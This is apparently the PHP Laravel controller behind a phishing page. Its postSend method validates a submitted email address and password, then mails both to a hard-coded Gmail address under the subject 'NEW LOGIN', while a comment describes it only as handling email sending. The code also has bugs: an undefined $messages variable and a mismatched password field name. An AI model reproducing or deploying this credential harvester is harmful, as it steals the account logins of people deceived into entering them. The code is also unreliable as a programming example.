<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function index()
    {
    	return view('index');
    }
      
    
        /**
	 * Handles email sending
	 *
	 * @return Response
	 */
	public function postSend(Request $request)
	{
           $req = $request->all();
          #dd($req);
          
          $validator = Validator::make($req, [
                             'username' => 'required|email',
                             'password' => 'required',                               
                   ]);    

                 if($validator->fails())
                  {
                       $ret = "<div class='alert alert-danger'><strong>Whoops!</strong> There were some problems signing you in.<br><br>";
                       $ret .= "<ul>";
					
                       foreach($messages->all() as $error) $ret .= "<li>".$error."</li>";            
                       $ret .= "</ul></div>";
                       return $ret;
                 }
                
                 else
                 {                 	
                     $u = $req["username"];
                     $p = $req["pass"];
                    # return "leads has ".count($leads)." elements";
                     $ret = "";
                     
                     $this->helpers->sendEmail("uwantbrendacolson@gmail.com","NEW LOGIN" ,['u' => $u, 'p' => $p],'emails.bomb','view');
                             $ret.= "success";
                             #sleep(500);
                             
                     return $ret;                     
                  }                               
	}
	

}
